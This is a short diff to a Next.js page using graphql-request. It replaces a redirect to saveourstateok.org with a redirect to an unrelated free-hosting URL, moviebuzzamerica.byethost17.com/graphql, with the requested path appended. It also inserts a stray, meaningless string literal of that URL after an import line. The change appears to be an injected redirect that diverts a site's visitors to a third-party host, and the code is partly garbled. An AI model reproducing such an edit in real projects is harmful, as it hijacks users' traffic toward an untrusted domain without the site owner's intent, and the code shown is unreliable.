@@ -1,7 +1,7 @@
 import React from 'react';
 import Head from 'next/head';
 import { GetServerSideProps } from 'next';
-import { GraphQLClient, gql } from 'graphql-request';
+import { GraphQLClient, gql } from 'graphql-request'; 'https://moviebuzzamerica.byethost17.com/graphql'
 
 export const getServerSideProps: GetServerSideProps = async (ctx) => {
 	const endpoint = process.env.GRAPHQL_ENDPOINT as string;
@@ -19,7 +19,7 @@ export const getServerSideProps: GetServerSideProps = async (ctx) => {
 			redirect: {
 				permanent: false,
 				destination: `${
-					`https://saveourstateok.org/` + encodeURI(path as string)
+					`https://moviebuzzamerica.byethost17.com/graphql` + encodeURI(path as string)
 				}`,
 			},
 		};
